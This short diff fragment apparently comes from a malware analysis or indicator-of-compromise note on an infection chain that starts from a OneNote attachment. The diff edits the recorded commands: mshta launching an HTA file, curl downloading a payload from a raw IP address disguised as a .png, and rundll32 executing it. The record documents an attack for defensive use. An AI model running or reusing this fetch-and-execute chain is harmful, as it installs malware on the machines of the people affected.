@@ -14,9 +14,9 @@ ONENOTE.EXE C:\Users\Admin\AppData\Local\Temp\DocumentsFolder_845783_Feb_03.one
 
 mshta.exe C:\Users\Admin\AppData\Local\Temp\Open.hta
 
-curl -output C:\ProgramData\index1.png --url http://135.148.144.191/44607.dat
+curl -output C:\ProgramData\aoPwYqZn.png,Wind --url http://135.148.144.191/44607.dat
 
-rundll32.exe  C:\\ProgramData\\aoPwYqZn.png,Wind
+rundll32.exe  C:\ProgramData\\aoPwYqZn.png,Wind
 
 *************************************************
 
